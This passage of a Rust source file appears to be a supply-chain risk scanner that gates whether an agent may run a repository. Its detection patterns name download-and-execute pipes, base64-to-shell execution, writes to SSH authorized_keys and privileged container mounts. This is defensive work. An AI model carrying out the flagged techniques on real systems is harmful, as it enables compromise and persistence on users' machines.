use std::collections::BTreeSet;

use serde::{Deserialize, Serialize};

use crate::config::{Policy, PolicyMatcher, ReportLanguage};

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    High,
    Medium,
    Low,
}

impl Severity {
    fn label_for(self, language: ReportLanguage) -> &'static str {
        if language == ReportLanguage::Zh {
            return match self {
                Severity::High => "\u{9ad8}",
                Severity::Medium => "\u{4e2d}",
                Severity::Low => "\u{4f4e}",
            };
        }
        match self {
            Severity::High => "HIGH",
            Severity::Medium => "MEDIUM",
            Severity::Low => "LOW",
        }
    }
}

/// Audit scope of a finding's path, used to keep severity proportionate:
/// production and CI risks stay sharp, while test, fixture, and doc paths are
/// capped so synthetic samples never masquerade as production vulnerabilities.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PathScope {
    Production,
    Ci,
    Test,
    TestFixture,
    Docs,
}

impl PathScope {
    fn classify(path: &str) -> PathScope {
        let lower = path.replace('\\', "/").to_ascii_lowercase();
        if lower.contains("tests/fixtures/")
            || lower.contains("test/fixtures/")
            || lower.contains("/fixtures/")
            || lower.starts_with("fixtures/")
            || lower.contains("testdata/")
        {
            return PathScope::TestFixture;
        }
        if lower.starts_with("tests/")
            || lower.contains("/tests/")
            || lower.starts_with("test/")
            || lower.contains("/test/")
            || lower.ends_with("_test.rs")
            || lower.ends_with("_test.go")
            || lower.ends_with(".test.ts")
            || lower.ends_with(".test.js")
            || lower.ends_with(".spec.ts")
            || lower.ends_with(".spec.js")
        {
            return PathScope::Test;
        }
        if lower.contains(".github/workflows/") {
            return PathScope::Ci;
        }
        if lower.starts_with("docs/")
            || lower.contains("/docs/")
            || lower.ends_with(".md")
            || lower.ends_with(".mdx")
        {
            return PathScope::Docs;
        }
        PathScope::Production
    }

    /// Cap a base severity to what the scope can justify. Severity Ord runs
    /// High < Medium < Low, so the less-severe value is the larger one; taking
    /// `max` with the most-severe-allowed value demotes anything above it.
    /// Docs keep full severity: a dangerous install instruction is a real
    /// signal a human or agent may follow. Only test and fixture code, which
    /// is never shipped, is capped.
    fn cap(self, severity: Severity) -> Severity {
        let max_allowed = match self {
            PathScope::Production | PathScope::Ci | PathScope::Docs => Severity::High,
            PathScope::Test | PathScope::TestFixture => Severity::Low,
        };
        severity.max(max_allowed)
    }

    fn code(self) -> &'static str {
        match self {
            PathScope::Production => "production",
            PathScope::Ci => "ci",
            PathScope::Test => "test",
            PathScope::TestFixture => "fixture",
            PathScope::Docs => "docs",
        }
    }

    fn label_for(self, language: ReportLanguage) -> &'static str {
        if language != ReportLanguage::Zh {
            return self.code();
        }
        match self {
            PathScope::Production => "\u{751f}\u{4ea7}",
            PathScope::Ci => "CI",
            PathScope::Test => "\u{6d4b}\u{8bd5}",
            PathScope::TestFixture => "\u{5939}\u{5177}",
            PathScope::Docs => "\u{6587}\u{6863}",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct RiskFinding {
    pub severity: Severity,
    pub path: String,
    pub line: Option<usize>,
    pub rule: String,
    pub title: String,
    pub evidence: String,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct AgentGateCoverage {
    pub candidate_files: usize,
    pub dehydrated_files: usize,
    pub read_failed: usize,
    pub unsupported_files: usize,
    pub parse_failed: usize,
    pub serialization_failed: usize,
    pub record_truncated: usize,
    pub seed_bytes: usize,
    pub suspicious_artifacts: Vec<SuspiciousArtifact>,
    pub truncated_records: Vec<TruncatedRecord>,
}

pub struct AgentGateReport {
    pub markdown: String,
    pub json: String,
    pub safe_to_agent_run: bool,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct SuspiciousArtifact {
    pub path: String,
    pub size_bytes: u64,
    pub reason: String,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct TruncatedRecord {
    pub path: String,
    pub original_bytes: usize,
    pub compacted_bytes: usize,
    pub reason: String,
}

#[derive(Debug, Deserialize)]
struct AstRow {
    path: String,
    #[serde(default)]
    external: Vec<String>,
    #[serde(default)]
    calls: Vec<String>,
    #[serde(default)]
    locations: Vec<AstLocationRow>,
}

#[derive(Debug, Deserialize)]
struct AstLocationRow {
    kind: String,
    line: usize,
    text: String,
}

struct RowRiskContext {
    package_json: bool,
    python_setup: bool,
    build_script: bool,
    github_workflow: bool,
    workflow_has_secret: bool,
}

impl RowRiskContext {
    fn new(row: &AstRow) -> Self {
        Self {
            package_json: is_package_json_path(&row.path),
            python_setup: is_python_setup_path(&row.path),
            build_script: is_build_script_path(&row.path),
            github_workflow: is_github_workflow_path(&row.path),
            workflow_has_secret: row
                .locations
                .iter()
                .any(|loc| contains_workflow_secret(&loc.text)),
        }
    }
}

pub fn findings_json_from_seed(seed: &str) -> String {
    let findings = findings_from_seed(seed);
    serde_json::to_string_pretty(&findings).unwrap_or_else(|_| "[]".to_string())
}

pub fn markdown_from_seed_with_language(seed: &str, language: ReportLanguage) -> String {
    render_markdown_with_language(&findings_from_seed(seed), language)
}

pub fn markdown_from_findings_json_with_language(
    input: &str,
    language: ReportLanguage,
) -> Option<String> {
    let findings: Vec<RiskFinding> = serde_json::from_str(input).ok()?;
    Some(render_markdown_with_language(&findings, language))
}

#[allow(dead_code)]
pub fn agent_gate_from_seed(seed: &str, coverage: AgentGateCoverage) -> AgentGateReport {
    agent_gate_from_seed_with_policy(seed, coverage, &Policy::default())
}

pub fn agent_gate_from_seed_with_policy(
    seed: &str,
    coverage: AgentGateCoverage,
    policy: &Policy,
) -> AgentGateReport {
    let (findings, policy_actions) = apply_policy(findings_from_seed(seed), policy);
    render_agent_gate(&findings, coverage, policy, &policy_actions)
}

pub fn findings_from_seed(seed: &str) -> Vec<RiskFinding> {
    let mut out = Vec::new();
    let mut seen = BTreeSet::new();
    let mut rows = Vec::new();

    for line in seed.lines() {
        let Ok(row) = serde_json::from_str::<AstRow>(line) else {
            continue;
        };
        rows.push(row);
    }

    for row in &rows {
        let ctx = RowRiskContext::new(row);

        if row.locations.is_empty() {
            for call in &row.calls {
                push_call_risk(&mut out, &mut seen, &row.path, None, call);
                push_supply_chain_risks(&mut out, &mut seen, &row.path, None, call, &ctx);
            }
        }

        for loc in &row.locations {
            push_supply_chain_risks(
                &mut out,
                &mut seen,
                &row.path,
                Some(loc.line),
                &loc.text,
                &ctx,
            );
            match loc.kind.as_str() {
                "call" => push_call_risk(&mut out, &mut seen, &row.path, Some(loc.line), &loc.text),
                "signature" => {
                    if loc.text.trim_start().starts_with("unsafe ") {
                        push_unique(
                            &mut out,
                            &mut seen,
                            RiskFinding {
                                severity: Severity::Medium,
                                path: row.path.clone(),
                                line: Some(loc.line),
                                rule: "unsafe-surface".to_string(),
                                title: "Unsafe surface requires manual audit".to_string(),
                                evidence: loc.text.clone(),
                            },
                        );
                    }
                }
                "import" if is_external_text(&loc.text) => push_unique(
                    &mut out,
                    &mut seen,
                    RiskFinding {
                        severity: Severity::Low,
                        path: row.path.clone(),
                        line: Some(loc.line),
                        rule: "external-blackbox".to_string(),
                        title: "Cross-boundary reference left as black box".to_string(),
                        evidence: loc.text.clone(),
                    },
                ),
                _ => {}
            }
        }

        for ext in &row.external {
            let text = ext.trim_start_matches("[EXTERNAL_BLACKBOX] ").to_string();
            push_unique(
                &mut out,
                &mut seen,
                RiskFinding {
                    severity: Severity::Low,
                    path: row.path.clone(),
                    line: None,
                    rule: "external-blackbox".to_string(),
                    title: "Cross-boundary reference left as black box".to_string(),
                    evidence: text,
                },
            );
        }
    }

    push_manifest_risks(&mut out, &mut seen, &rows);
    push_container_global_risks(&mut out, &mut seen, &rows);

    out.sort_by(|a, b| {
        severity_rank(a.severity)
            .cmp(&severity_rank(b.severity))
            .then_with(|| a.path.cmp(&b.path))
            .then_with(|| a.line.cmp(&b.line))
            .then_with(|| a.rule.cmp(&b.rule))
    });
    out
}

pub fn render_markdown_with_language(findings: &[RiskFinding], language: ReportLanguage) -> String {
    let mut s = match language {
        ReportLanguage::En => String::from("# Risk Ledger\n\n"),
        ReportLanguage::Zh => String::from("# \u{98ce}\u{9669}\u{8d26}\u{672c}\n\n"),
    };
    s.push_str(&render_table_with_language(findings, language));
    s
}

/// Render only the table body (or the empty-state line) without an H1 heading,
/// so callers can place the authoritative ledger under their own section.
pub fn render_table_with_language(findings: &[RiskFinding], language: ReportLanguage) -> String {
    let mut s = String::new();
    if findings.is_empty() {
        s.push_str(match language {
            ReportLanguage::En => "No deterministic risks found in the analyzed input. Review coverage, runtime behavior, configuration, and cross-module semantics manually.\n",
            ReportLanguage::Zh => "\u{672a}\u{5728}\u{5206}\u{6790}\u{8f93}\u{5165}\u{4e2d}\u{53d1}\u{73b0}\u{786e}\u{5b9a}\u{6027}\u{98ce}\u{9669}\u{3002}\u{8bf7}\u{4eba}\u{5de5}\u{590d}\u{6838}\u{8986}\u{76d6}\u{7387}\u{3001}\u{8fd0}\u{884c}\u{65f6}\u{884c}\u{4e3a}\u{3001}\u{914d}\u{7f6e}\u{548c}\u{8de8}\u{6a21}\u{5757}\u{8bed}\u{4e49}\u{3002}\n",
        });
        return s;
    }

    s.push_str(match language {
        ReportLanguage::En => "| Severity | Scope | Location | Rule | Finding |\n",
        ReportLanguage::Zh => {
            "|\u{4e25}\u{91cd}\u{6027}|\u{4f5c}\u{7528}\u{57df}|\u{4f4d}\u{7f6e}|\u{89c4}\u{5219}|\u{53d1}\u{73b0}|\n"
        }
    });
    s.push_str("|---|---|---|---|---|\n");
    for f in findings {
        let location = match f.line {
            Some(line) => format!("{}:{line}", f.path),
            None => f.path.clone(),
        };
        s.push_str(&format!(
            "| {} | {} | `{}` | `{}` | {}: `{}` |\n",
            f.severity.label_for(language),
            PathScope::classify(&f.path).label_for(language),
            escape_cell(&location),
            escape_cell(&f.rule),
            escape_cell(title_for_language(&f.title, language)),
            escape_cell(&f.evidence),
        ));
    }
    s
}

/// Authoritative deterministic ledger table built straight from the seed,
/// independent of any model narrative.
pub fn markdown_table_from_seed_with_language(seed: &str, language: ReportLanguage) -> String {
    render_table_with_language(&findings_from_seed(seed), language)
}

fn title_for_language(title: &str, language: ReportLanguage) -> &str {
    if language != ReportLanguage::Zh {
        return title;
    }
    match title {
        "Unchecked unwrap/expect can panic" => {
            "\u{672a}\u{68c0}\u{67e5}\u{7684} unwrap/expect \u{53ef}\u{80fd} panic"
        }
        "Explicit panic path" => "\u{663e}\u{5f0f} panic \u{8def}\u{5f84}",
        "Subprocess boundary requires timeout and input control" => {
            "\u{5b50}\u{8fdb}\u{7a0b}\u{8fb9}\u{754c}\u{9700}\u{8981}\u{8d85}\u{65f6}\u{548c}\u{8f93}\u{5165}\u{63a7}\u{5236}"
        }
        "Unsafe surface requires manual audit" => {
            "unsafe \u{8868}\u{9762}\u{9700}\u{8981}\u{4eba}\u{5de5}\u{5ba1}\u{8ba1}"
        }
        "Cross-boundary reference left as black box" => {
            "\u{8de8}\u{8fb9}\u{754c}\u{5f15}\u{7528}\u{4ecd}\u{662f}\u{9ed1}\u{76d2}"
        }
        _ => title,
    }
}

fn render_agent_gate(
    findings: &[RiskFinding],
    coverage: AgentGateCoverage,
    policy: &Policy,
    policy_actions: &[String],
) -> AgentGateReport {
    let incomplete = gate_incomplete_reasons(&coverage, policy);
    let verdict = if !incomplete.is_empty() {
        "INCOMPLETE"
    } else if findings.iter().any(|f| f.severity == Severity::High) {
        "REJECT"
    } else if !coverage.suspicious_artifacts.is_empty() {
        "CAUTION"
    } else if findings.is_empty() {
        "ACCEPT"
    } else {
        "CAUTION"
    };
    let safe_to_agent_run = verdict == "ACCEPT";
    let mut s = format!("VERDICT: {verdict}\n");

    s.push_str("WHY:\n");
    let why = gate_why_lines(findings, &coverage, &incomplete);
    for line in &why {
        s.push_str("- ");
        s.push_str(line);
        s.push('\n');
    }

    s.push_str("BLOCKERS:\n");
    let blockers = gate_blocker_lines(findings, &coverage, &incomplete);
    if blockers.is_empty() {
        s.push_str("- none\n");
    } else {
        for line in &blockers {
            s.push_str("- ");
            s.push_str(line);
            s.push('\n');
        }
    }

    s.push_str(&format!(
        "SAFE_TO_AGENT_RUN: {}\n\n",
        if safe_to_agent_run { "yes" } else { "no" }
    ));
    s.push_str("COVERAGE:\n");
    s.push_str(&format!(
        "- candidate_files: {}\n- dehydrated_files: {}\n- unsupported_files: {}\n- read_failed: {}\n- parse_failed: {}\n- serialization_failed: {}\n- record_truncated: {}\n",
        coverage.candidate_files,
        coverage.dehydrated_files,
        coverage.unsupported_files,
        coverage.read_failed,
        coverage.parse_failed,
        coverage.serialization_failed,
        coverage.record_truncated,
    ));
    s.push_str(&format!("- seed_bytes: {}\n", coverage.seed_bytes));
    if !coverage.truncated_records.is_empty() {
        s.push_str("TRUNCATED_RECORDS:\n");
        for record in coverage.truncated_records.iter().take(10) {
            s.push_str(&format!(
                "- {} original_bytes={} compacted_bytes={} reason={}\n",
                record.path, record.original_bytes, record.compacted_bytes, record.reason
            ));
        }
    }
    if !coverage.suspicious_artifacts.is_empty() {
        s.push_str("ARTIFACTS:\n");
        for artifact in coverage.suspicious_artifacts.iter().take(10) {
            s.push_str(&format!(
                "- {} size_bytes={} reason={}\n",
                artifact.path, artifact.size_bytes, artifact.reason
            ));
        }
    }
    if !policy_actions.is_empty() {
        s.push_str("POLICY:\n");
        for action in policy_actions {
            s.push_str("- ");
            s.push_str(action);
            s.push('\n');
        }
    }

    let json = serde_json::to_string_pretty(&AgentGateJson {
        schema_version: 1,
        verdict,
        safe_to_agent_run,
        exit_reason: verdict.to_ascii_lowercase(),
        why,
        blockers,
        coverage,
        findings: findings.to_vec(),
        policy_actions: policy_actions.to_vec(),
    })
    .unwrap_or_else(|_| "{}".to_string());

    AgentGateReport {
        markdown: s,
        json,
        safe_to_agent_run,
    }
}

#[derive(Serialize)]
struct AgentGateJson<'a> {
    schema_version: u8,
    verdict: &'a str,
    safe_to_agent_run: bool,
    exit_reason: String,
    why: Vec<String>,
    blockers: Vec<String>,
    coverage: AgentGateCoverage,
    findings: Vec<RiskFinding>,
    policy_actions: Vec<String>,
}

fn gate_incomplete_reasons(coverage: &AgentGateCoverage, policy: &Policy) -> Vec<String> {
    let mut reasons = Vec::new();
    if coverage.read_failed > 0 {
        reasons.push(format!("read_failed={}", coverage.read_failed));
    }
    if coverage.parse_failed > 0 {
        reasons.push(format!("parse_failed={}", coverage.parse_failed));
    }
    if coverage.serialization_failed > 0 {
        reasons.push(format!(
            "serialization_failed={}",
            coverage.serialization_failed
        ));
    }
    if coverage.candidate_files > 0
        && coverage.dehydrated_files == 0
        && coverage.suspicious_artifacts.is_empty()
    {
        reasons.push("no_supported_files_dehydrated".to_string());
    }
    if let Some(limit) = policy.max_candidate_files
        && coverage.candidate_files > limit
    {
        reasons.push(format!(
            "candidate_files={} exceeds policy max_candidate_files={limit}",
            coverage.candidate_files
        ));
    }
    reasons
}

fn gate_why_lines(
    findings: &[RiskFinding],
    coverage: &AgentGateCoverage,
    incomplete: &[String],
) -> Vec<String> {
    if !incomplete.is_empty() {
        return incomplete
            .iter()
            .take(3)
            .map(|reason| format!("Input coverage is incomplete: {reason}"))
            .collect();
    }
    if findings.is_empty() {
        if !coverage.suspicious_artifacts.is_empty() {
            return coverage
                .suspicious_artifacts
                .iter()
                .take(3)
                .map(|artifact| format!("Suspicious artifact requires review: {}", artifact.path))
                .collect();
        }
        return vec![
            "No deterministic risks found in the analyzed input.".to_string(),
            "This gate does not replace manual review of runtime behavior.".to_string(),
        ];
    }
    findings
        .iter()
        .take(3)
        .map(|finding| {
            format!(
                "{} {}",
                finding.severity.label_for(ReportLanguage::En),
                finding_summary(finding)
            )
        })
        .collect()
}

fn gate_blocker_lines(
    findings: &[RiskFinding],
    coverage: &AgentGateCoverage,
    incomplete: &[String],
) -> Vec<String> {
    if !incomplete.is_empty() {
        let mut lines: Vec<String> = incomplete
            .iter()
            .map(|reason| format!("coverage requires review: {reason}"))
            .collect();
        for record in coverage.truncated_records.iter().take(10) {
            lines.push(format!(
                "truncated record: {} original_bytes={} compacted_bytes={} reason={}",
                record.path, record.original_bytes, record.compacted_bytes, record.reason
            ));
        }
        return lines;
    }
    let mut lines: Vec<String> = findings
        .iter()
        .filter(|finding| finding.severity != Severity::Low)
        .take(10)
        .map(finding_summary)
        .collect();
    for artifact in coverage.suspicious_artifacts.iter().take(10) {
        lines.push(format!(
            "artifact requires review: {} size_bytes={} reason={}",
            artifact.path, artifact.size_bytes, artifact.reason
        ));
    }
    lines
}

fn apply_policy(findings: Vec<RiskFinding>, policy: &Policy) -> (Vec<RiskFinding>, Vec<String>) {
    let mut actions = Vec::new();
    let mut out = Vec::new();
    for mut finding in findings {
        if let Some(rule) = policy
            .allowlist
            .iter()
            .find(|rule| policy_match(rule, &finding))
        {
            actions.push(format!(
                "suppressed {} at {} by allowlist{}",
                finding.rule,
                finding.path,
                policy_reason(rule.reason.as_deref())
            ));
            continue;
        }
        if let Some(rule) = policy
            .denylist
            .iter()
            .find(|rule| policy_match(rule, &finding))
            && finding.severity != Severity::High
        {
            finding.severity = Severity::High;
            actions.push(format!(
                "raised {} at {} to high by denylist{}",
                finding.rule,
                finding.path,
                policy_reason(rule.reason.as_deref())
            ));
        }
        for override_rule in &policy.severity_overrides {
            if policy_override_match(override_rule, &finding)
                && let Some(severity) = severity_from_policy(&override_rule.severity)
                && finding.severity != severity
            {
                finding.severity = severity;
                actions.push(format!(
                    "set {} at {} severity to {} by override{}",
                    finding.rule,
                    finding.path,
                    override_rule.severity,
                    policy_reason(override_rule.reason.as_deref())
                ));
            }
        }
        out.push(finding);
    }
    (out, actions)
}

fn policy_match(rule: &PolicyMatcher, finding: &RiskFinding) -> bool {
    rule.path
        .as_deref()
        .is_none_or(|path| normalized_path(&finding.path).contains(&normalized_path(path)))
        && rule
            .rule
            .as_deref()
            .is_none_or(|r| r == finding.rule.as_str())
}

fn policy_override_match(
    rule: &crate::config::PolicySeverityOverride,
    finding: &RiskFinding,
) -> bool {
    rule.path
        .as_deref()
        .is_none_or(|path| normalized_path(&finding.path).contains(&normalized_path(path)))
        && rule
            .rule
            .as_deref()
            .is_none_or(|r| r == finding.rule.as_str())
}

fn severity_from_policy(value: &str) -> Option<Severity> {
    match value {
        "high" => Some(Severity::High),
        "medium" => Some(Severity::Medium),
        "low" => Some(Severity::Low),
        _ => None,
    }
}

fn policy_reason(reason: Option<&str>) -> String {
    reason
        .filter(|reason| !reason.trim().is_empty())
        .map(|reason| format!(" ({reason})"))
        .unwrap_or_default()
}

fn finding_summary(finding: &RiskFinding) -> String {
    let location = match finding.line {
        Some(line) => format!("{}:{line}", finding.path),
        None => finding.path.clone(),
    };
    format!(
        "{} [{}]: {} ({}) [scope={}]",
        location,
        finding.rule,
        finding.title,
        finding.evidence,
        PathScope::classify(&finding.path).code()
    )
}

fn push_call_risk(
    out: &mut Vec<RiskFinding>,
    seen: &mut BTreeSet<String>,
    path: &str,
    line: Option<usize>,
    call: &str,
) {
    let rule = if is_panic_edge_call(call) {
        Some((
            "panic-edge",
            Severity::High,
            "Unchecked unwrap/expect can panic",
        ))
    } else if call.contains("panic") && call.contains('!') {
        Some(("explicit-panic", Severity::High, "Explicit panic path"))
    } else if call.contains("std::process::Command") {
        Some((
            "subprocess-boundary",
            Severity::Medium,
            "Subprocess boundary requires timeout and input control",
        ))
    } else {
        None
    };

    if let Some((rule, severity, title)) = rule {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity,
                path: path.to_string(),
                line,
                rule: rule.to_string(),
                title: title.to_string(),
                evidence: call.to_string(),
            },
        );
    }
}

fn push_supply_chain_risks(
    out: &mut Vec<RiskFinding>,
    seen: &mut BTreeSet<String>,
    path: &str,
    line: Option<usize>,
    text: &str,
    ctx: &RowRiskContext,
) {
    if ctx.package_json && is_npm_lifecycle_script(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::High,
                path: path.to_string(),
                line,
                rule: "npm-lifecycle-script".to_string(),
                title: "NPM lifecycle script executes during install".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if ctx.build_script && looks_like_subprocess_or_shell(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::High,
                path: path.to_string(),
                line,
                rule: "rust-build-script-command".to_string(),
                title: "Rust build script invokes a command boundary".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if ctx.python_setup && looks_like_python_setup_command(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::High,
                path: path.to_string(),
                line,
                rule: "python-setup-command".to_string(),
                title: "Python setup script invokes a command boundary".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if looks_like_download_execute(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::High,
                path: path.to_string(),
                line,
                rule: "download-execute".to_string(),
                title: "Downloaded content is executed or made executable".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if looks_like_home_or_ssh_write(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::High,
                path: path.to_string(),
                line,
                rule: "install-home-write".to_string(),
                title: "Install path writes to HOME or SSH configuration".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if looks_like_base64_execute(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::High,
                path: path.to_string(),
                line,
                rule: "base64-execute".to_string(),
                title: "Base64-decoded content flows into execution".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if looks_like_dynamic_shell_eval(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::Medium,
                path: path.to_string(),
                line,
                rule: "dynamic-shell-eval".to_string(),
                title: "Dynamic shell evaluation requires manual review".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if ctx.github_workflow && looks_like_workflow_secret_shell(text, ctx.workflow_has_secret) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::Medium,
                path: path.to_string(),
                line,
                rule: "workflow-secret-shell".to_string(),
                title: "GitHub Actions shell path is coupled to secrets".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if ctx.github_workflow && is_unpinned_action_use(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::Medium,
                path: path.to_string(),
                line,
                rule: "unpinned-github-action".to_string(),
                title: "GitHub Action reference is not pinned to a commit SHA".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if ctx.github_workflow && looks_like_pull_request_target(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::High,
                path: path.to_string(),
                line,
                rule: "workflow-pull-request-target".to_string(),
                title: "pull_request_target can run untrusted contribution code with elevated token scope".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if ctx.github_workflow && looks_like_write_all_permissions(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::High,
                path: path.to_string(),
                line,
                rule: "workflow-write-all".to_string(),
                title: "GitHub Actions workflow grants broad write permissions".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if is_dockerfile_path(path) && looks_like_remote_package_repository(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::High,
                path: path.to_string(),
                line,
                rule: "docker-remote-repository".to_string(),
                title: "Dockerfile adds a remote package repository during build".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if is_dockerfile_path(path) && looks_like_docker_root_user(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::Medium,
                path: path.to_string(),
                line,
                rule: "docker-root-user".to_string(),
                title: "Container build explicitly runs as root".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if looks_like_privileged_container(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::High,
                path: path.to_string(),
                line,
                rule: "container-privileged".to_string(),
                title: "Container configuration requests privileged or host-mounted execution"
                    .to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }
}

fn is_panic_edge_call(call: &str) -> bool {
    let unwrap_like = call.contains(".unwrap") && !call.contains(".unwrap_or");
    unwrap_like || call.contains(".expect")
}

fn is_package_json_path(path: &str) -> bool {
    normalized_path(path).ends_with("/package.json") || normalized_path(path) == "package.json"
}

fn is_python_setup_path(path: &str) -> bool {
    normalized_path(path).ends_with("/setup.py") || normalized_path(path) == "setup.py"
}

fn is_build_script_path(path: &str) -> bool {
    normalized_path(path).ends_with("/build.rs") || normalized_path(path) == "build.rs"
}

fn is_github_workflow_path(path: &str) -> bool {
    let path = normalized_path(path);
    path.contains("/.github/workflows/") || path.starts_with(".github/workflows/")
}

fn normalized_path(path: &str) -> String {
    path.replace('\\', "/")
}

fn is_npm_lifecycle_script(text: &str) -> bool {
    [
        "preinstall",
        "install",
        "postinstall",
        "prepare",
        "prepack",
        "postpack",
    ]
    .iter()
    .any(|key| text.contains(&format!("\"{key}\"")) && text.contains(':'))
}

fn looks_like_subprocess_or_shell(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("std::process::command")
        || lower.contains("command::new")
        || lower.contains("process::command")
        || lower.contains("shell")
        || lower.contains("cmd")
}

fn looks_like_python_setup_command(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("os.system")
        || lower.contains("os.popen")
        || lower.contains("subprocess.")
        || lower.contains("subprocess::")
}

fn looks_like_download_execute(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    let downloads = lower.contains("curl") || lower.contains("wget");
    downloads
        && (lower.contains("| sh")
            || lower.contains("|sh")
            || lower.contains("| bash")
            || lower.contains("|bash")
            || lower.contains("bash -c")
            || lower.contains("sh -c")
            || lower.contains("chmod +x")
            || lower.contains("&& ./")
            || lower.contains("; ./"))
}

fn looks_like_home_or_ssh_write(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    let home_or_ssh = lower.contains("~/.ssh")
        || lower.contains("$home/.ssh")
        || lower.contains("${home}/.ssh")
        || lower.contains("/.ssh/config")
        || lower.contains("/.ssh/authorized_keys");
    let write_op = lower.contains(">>")
        || lower.contains("> ")
        || lower.contains("tee ")
        || lower.contains("cat >")
        || lower.contains("install ")
        || lower.contains("chmod ");
    home_or_ssh && write_op
}

fn looks_like_base64_execute(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("base64")
        && (lower.contains("-d") || lower.contains("--decode"))
        && (lower.contains("| sh")
            || lower.contains("|sh")
            || lower.contains("| bash")
            || lower.contains("|bash")
            || lower.contains("bash -c")
            || lower.contains("sh -c")
            || lower.contains("eval"))
}

fn looks_like_dynamic_shell_eval(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("eval ") || lower.contains("eval(") || lower.contains("bash -c")
}

fn contains_workflow_secret(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("secrets.") || lower.contains("secrets[")
}

fn is_run_line(text: &str) -> bool {
    text.trim_start().starts_with("run:")
}

fn looks_like_workflow_secret_shell(text: &str, workflow_has_secret: bool) -> bool {
    let lower = text.to_ascii_lowercase();
    if contains_workflow_secret(text)
        && (is_run_line(text)
            || lower.contains("bash")
            || lower.contains("sh ")
            || lower.contains("shell:"))
    {
        return true;
    }
    workflow_has_secret
        && is_run_line(text)
        && (lower.contains("${{ github.event")
            || lower.contains("${{ github.head_ref")
            || lower.contains("${{ github.ref_name")
            || lower.contains("${{ inputs.")
            || lower.contains("${{ matrix.")
            || lower.contains("eval ")
            || lower.contains("bash -c")
            || lower.contains("sh -c"))
}

fn looks_like_pull_request_target(text: &str) -> bool {
    text.to_ascii_lowercase().contains("pull_request_target")
}

fn looks_like_write_all_permissions(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("permissions: write-all")
}

fn is_dockerfile_path(path: &str) -> bool {
    let path = normalized_path(path).to_ascii_lowercase();
    path.ends_with("/dockerfile")
        || path == "dockerfile"
        || path.ends_with("/containerfile")
        || path == "containerfile"
        || path.ends_with(".dockerfile")
        || path.ends_with(".containerfile")
}

fn looks_like_remote_package_repository(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    (lower.contains("add-apt-repository")
        || lower.contains("/etc/apt/sources.list")
        || lower.contains("/etc/yum.repos.d")
        || lower.contains("apk add") && lower.contains("--repository"))
        && (lower.contains("http://") || lower.contains("https://") || lower.contains("curl"))
}

fn looks_like_docker_root_user(text: &str) -> bool {
    text.trim_start()
        .to_ascii_lowercase()
        .starts_with("user root")
}

fn looks_like_privileged_container(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("--privileged")
        || lower.contains("privileged: true")
        || lower.contains("/var/run/docker.sock")
        || lower.contains(":/host")
        || lower.contains("source: /")
}

fn is_unpinned_action_use(text: &str) -> bool {
    let trimmed = text.trim_start();
    if !trimmed.starts_with("uses:") {
        return false;
    }
    let Some((_, reference)) = trimmed.split_once('@') else {
        return true;
    };
    !is_full_sha(reference.trim())
}

fn is_full_sha(reference: &str) -> bool {
    reference.len() == 40 && reference.chars().all(|c| c.is_ascii_hexdigit())
}

fn push_manifest_risks(out: &mut Vec<RiskFinding>, seen: &mut BTreeSet<String>, rows: &[AstRow]) {
    let paths: BTreeSet<String> = rows
        .iter()
        .map(|row| normalized_path(&row.path).to_ascii_lowercase())
        .collect();
    let has_package_json = paths
        .iter()
        .any(|p| p.ends_with("/package.json") || p == "package.json");
    let has_npm_lock = paths.iter().any(|p| {
        matches!(
            p.as_str(),
            "package-lock.json" | "pnpm-lock.yaml" | "yarn.lock" | "bun.lockb"
        ) || p.ends_with("/package-lock.json")
            || p.ends_with("/pnpm-lock.yaml")
